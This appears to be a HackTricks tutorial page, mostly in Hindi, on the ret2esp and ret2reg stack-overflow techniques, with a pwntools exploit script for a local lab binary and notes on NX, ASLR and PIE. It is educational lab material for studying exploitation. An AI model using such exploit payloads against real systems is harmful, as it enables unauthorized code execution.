# Ret2esp / Ret2reg

{{#include ../../../banners/hacktricks-training.md}}

## **Ret2esp**

**क्योंकि ESP (स्टैक पॉइंटर) हमेशा स्टैक के शीर्ष की ओर इशारा करता है**, यह तकनीक EIP (इंस्ट्रक्शन पॉइंटर) को **`jmp esp`** या **`call esp`** इंस्ट्रक्शन के पते से बदलने में शामिल है। ऐसा करने से, शेलकोड ठीक ओवरराइटेड EIP के बाद रखा जाता है। जब `ret` इंस्ट्रक्शन निष्पादित होता है, तो ESP अगले पते की ओर इशारा करता है, ठीक उसी जगह जहां शेलकोड संग्रहीत है।

यदि **एड्रेस स्पेस लेआउट रैंडमाइजेशन (ASLR)** Windows या Linux में सक्षम नहीं है, तो साझा लाइब्रेरी में पाए जाने वाले `jmp esp` या `call esp` इंस्ट्रक्शनों का उपयोग करना संभव है। हालाँकि, [**ASLR**](../common-binary-protections-and-bypasses/aslr/) सक्रिय होने पर, आपको इन इंस्ट्रक्शनों के लिए कमजोर प्रोग्राम के भीतर देखना पड़ सकता है (और आपको [**PIE**](../common-binary-protections-and-bypasses/pie/) को भी हराना पड़ सकता है)।

इसके अलावा, EIP भ्रष्टाचार के **बाद शेलकोड रखने** में सक्षम होना, न कि स्टैक के मध्य में, यह सुनिश्चित करता है कि फ़ंक्शन के संचालन के दौरान निष्पादित किसी भी `push` या `pop` इंस्ट्रक्शनों का शेलकोड के साथ हस्तक्षेप नहीं होता है। यह हस्तक्षेप तब हो सकता है जब शेलकोड फ़ंक्शन के स्टैक के मध्य में रखा गया हो।

### स्थान की कमी

यदि आप RIP को ओवरराइट करने के बाद लिखने के लिए स्थान की कमी महसूस कर रहे हैं (शायद केवल कुछ बाइट्स), तो एक प्रारंभिक `jmp` शेलकोड लिखें जैसे:
```armasm
sub rsp, 0x30
jmp rsp
```
और स्टैक में जल्दी शेलकोड लिखें।

### उदाहरण

आप इस तकनीक का एक उदाहरण [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp) में एक अंतिम एक्सप्लॉइट के साथ पा सकते हैं:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

jmp_rsp = next(elf.search(asm('jmp rsp')))

payload = b'A' * 120
payload += p64(jmp_rsp)
payload += asm('''
sub rsp, 10;
jmp rsp;
''')

pause()
p.sendlineafter('RSP!\n', payload)
p.interactive()
```
## Ret2reg

इसी तरह, यदि हम जानते हैं कि एक फ़ंक्शन उस पते को लौटाता है जहाँ शेलकोड संग्रहीत है, तो हम **`call eax`** या **`jmp eax`** निर्देशों का उपयोग कर सकते हैं (जिसे **ret2eax** तकनीक के रूप में जाना जाता है), जो हमारे शेलकोड को निष्पादित करने का एक और तरीका प्रदान करता है। जैसे eax, **कोई अन्य रजिस्टर** जिसमें एक दिलचस्प पता हो, का उपयोग किया जा सकता है (**ret2reg**).

### Example

You can find an example here: [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/ret2reg/using-ret2reg](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/ret2reg/using-ret2reg)

## Protections

- [**NX**](../common-binary-protections-and-bypasses/no-exec-nx.md): यदि स्टैक निष्पादन योग्य नहीं है तो यह मदद नहीं करेगा क्योंकि हमें शेलकोड को स्टैक में रखना है और इसे निष्पादित करने के लिए कूदना है।
- [**ASLR**](../common-binary-protections-and-bypasses/aslr/) & [**PIE**](../common-binary-protections-and-bypasses/pie/): ये esp या किसी अन्य रजिस्टर पर कूदने के लिए एक निर्देश खोजने को कठिन बना सकते हैं।

## References

- [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode)
- [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp)

{{#include ../../../banners/hacktricks-training.md}}
